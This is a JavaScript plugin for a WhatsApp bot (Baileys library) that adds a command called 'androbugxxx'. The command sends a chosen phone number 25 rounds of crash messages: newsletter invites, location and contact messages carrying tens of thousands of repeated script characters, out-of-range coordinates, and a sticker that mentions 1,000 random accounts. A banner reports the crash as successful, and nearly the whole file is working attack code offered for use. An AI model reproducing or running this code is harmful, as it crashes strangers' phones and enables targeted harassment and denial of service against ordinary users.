import { generateWAMessageFromContent } from '@whiskeysockets/baileys'; // o la librería que uses para generar mensajes

// Handler principal let handler = async (m, { conn, text, isBan, reply }) => { if (isBan) return reply("`[ ! ]` You Have Been Banned");

let targetId = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender;

let doneandro =  *\ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮ᵢ𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠`*🩸🐍 ⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId} ⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp Android ⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Successfully `;

try { await conn.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/w1isit.jpg' }, caption: doneandro, footer: 'Please pause for 10 minutes so that the bot is not banned', buttons: [ { buttonId: '#', buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' }, type: 1, }, ], headerType: 4, viewOnce: true, }, { quoted: m });

for (let i = 0; i < 25; i++) {
  await bugandro2(targetId, true, conn);
  await androbug1(targetId, true, conn);
}
for (let i = 0; i < 25; i++) {
  await protocolbug3(targetId, true, conn);
  await bulldozer(targetId, conn);
}

} catch (error) { console.error('Error sending bug:', error); reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗'); } };

handler.command = ['androbugxxx']; handler.rowner = false; handler.premium = false;

export default handler;

// -------- FUNCIONES UTILIZADAS --------

async function bugandro2(target, ptcp = true, conn) { const message = { botInvokeMessage: { message: { newsletterAdminInviteMessage: { newsletterJid: 1@newsletter, newsletterName: "ꦾ".repeat(120000), jpegThumbnail: "", caption: "ꦽ".repeat(15000) + "ꦾ".repeat(90000), inviteExpiration: Date.now() + 1814400000, }, }, }, }; await conn.relayMessage(target, message, { userJid: target }); }

async function androbug1(target, ptcp = true, conn) { let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(90000); await conn.relayMessage( target, { locationMessage: { degreesLatitude: 999.99999999999999, degreesLongitude: -999.99999999999999, name: CrashQAiphone, url: "https://youtube.com/@raldzzoffc", }, }, {}); }

async function protocolbug3(target, ptcp = true, conn) { const caption = "꧅꧄꧃꧁꧂꧁꧂꧃".repeat(50000); await conn.sendMessage(target, { contactMessage: { displayName: caption }, }); }

async function bulldozer(target, conn) { const msg = { viewOnceMessage: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...", fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=", mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=", mimetype: "image/webp", directPath: "/v/t62.7161-24/...", fileLength: { low: 1, high: 99999, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false }, isAnimated: true, contextInfo: { mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 1000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net") ], groupMentions: [] }, }, }, }, }; const fullMsg = generateWAMessageFromContent(target, msg, {}); await conn.relayMessage("status@broadcast", fullMsg.message, { messageId: fullMsg.key.id, statusJidList: [target], }); }

